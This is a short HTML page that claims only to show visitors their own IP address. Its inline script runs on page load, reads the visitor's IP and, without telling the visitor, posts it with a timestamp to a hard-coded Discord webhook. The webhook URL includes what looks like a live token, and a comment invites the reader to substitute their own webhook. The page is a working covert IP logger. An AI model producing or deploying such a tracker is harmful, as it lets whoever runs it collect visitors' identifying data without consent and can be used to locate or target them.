<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Your IP Address</title>
</head>
<body>
<h2>Your IP Address</h2>
<p id="ipDisplay">Loading your IP...</p>

<script>
  // Replace with your real webhook URL (Discord or your server)
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1434137186806005820/Lrf8JKjayqMQT2SYt2y-0WCSUSHHpOnJ5BGPiyc3ld6wI8RonJ0NrWcBzawpI65RQSMz";

  async function getIp() {
    try {
      // Step 1: Get the IP
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      const ip = data.ip;
      document.getElementById('ipDisplay').textContent = 'Your IP is: ' + ip;

      console.log('Fetched IP:', ip);

      // Step 2: Send to webhook
      const payload = { ip: ip, time: new Date().toISOString() };

      const webhookResponse = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!webhookResponse.ok) {
        throw new Error(`Webhook returned ${webhookResponse.status}`);
      }

      console.log('Successfully sent IP to webhook');
    } catch (error) {
      console.error('Error:', error);
      document.getElementById('ipDisplay').textContent = 'Error: ' + error.message;
    }
  }

  getIp();
</script>
</body>
</html>
